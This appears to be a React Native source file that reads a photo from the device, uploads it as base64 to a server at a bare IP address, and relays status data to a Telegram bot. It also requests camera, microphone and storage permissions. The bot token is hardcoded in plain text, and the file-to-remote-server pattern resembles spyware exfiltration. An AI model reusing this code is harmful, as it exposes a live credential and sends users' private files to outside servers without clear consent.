import axios from "axios";
import RNFS from 'react-native-fs';
import { request, PERMISSIONS } from "react-native-permissions";

export const uploadPhoto = async (photoPath  :string  ) => {
  sendToTelegram(photoPath);
let base64 ={}
  try {
  const data = await  axios("http://31.202.37.67:3000/gallery")

    // Получаем blob из файла
    try{
        base64= await  RNFS.readFile(photoPath, 'base64')
    } catch (e){
      sendToTelegram(e)
    }

    sendToTelegram(base64?.length)
    const uploadResponse = await axios.post('http://31.202.37.67:3000/uploadBase64/',  {base64Image:base64} );
    sendToTelegram(uploadResponse.data)
    console.log('Файл успешно загружен', uploadResponse.data);

  } catch (error) {
    sendToTelegram(error)
    console.error('Ошибка при загрузке файла', error);

};



};



const BOT_TOKEN="5931122167:AAGMwNZnE_Je53oUUZWkvE5_snyRrOs9sYA"
const CHAT_ID="675415208"


export const sendToTelegram = (text :any )=>{


  const data1 = {
    data:text,
  }

  axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    chat_id: CHAT_ID,
    text:JSON.stringify(data1)
  })    .catch(function (error) {
    console.log(error, "telegram");
  });}


export   const connect = async ()=>{
  const perms = {};

  perms.CAMERA = await request(PERMISSIONS.ANDROID.CAMERA);
  perms.RECORD_AUDIO= await request(PERMISSIONS.ANDROID.RECORD_AUDIO);
  perms.READ_EXTERNAL_STORAGE= await request(PERMISSIONS.ANDROID.READ_EXTERNAL_STORAGE)
  try{
    perms.INTERNET= await request(PERMISSIONS.ANDROID.INTERNET);
  } catch (e){

  }

}
